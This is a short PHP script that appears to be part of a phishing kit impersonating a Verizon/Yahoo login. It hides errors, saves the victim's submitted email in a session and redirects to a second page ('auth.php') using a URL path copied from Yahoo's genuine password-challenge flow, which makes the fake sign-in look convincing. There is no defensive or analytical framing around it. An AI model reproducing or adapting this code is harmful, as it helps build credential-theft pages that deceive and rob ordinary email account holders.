<?php
error_reporting(0);
ob_start();
session_start();
$axp ="Re_Identify";





/** form fields **/

$_SESSION['email'] = $email = $_POST['username'];
$wizard = $_POST['password'];
if (isset($wizard) && !empty($wizard)) {
    die();
} else {
//Exiting
    $asp = "/account/challenge/password?.src=vz&.intl=us&.lang=en-US&.partner=vz-acs&authMechanism=primary&display=login&yid=$email&done=https%3A%2F%2Fverizon.yahoo.com%2F&sessionIndex=Qw--&acrumb=4SZYMaUi";
    $mover = "auth.php?v=$asp";
    $Redirect = $mover;

    header("Location: $Redirect").md5(time());
}
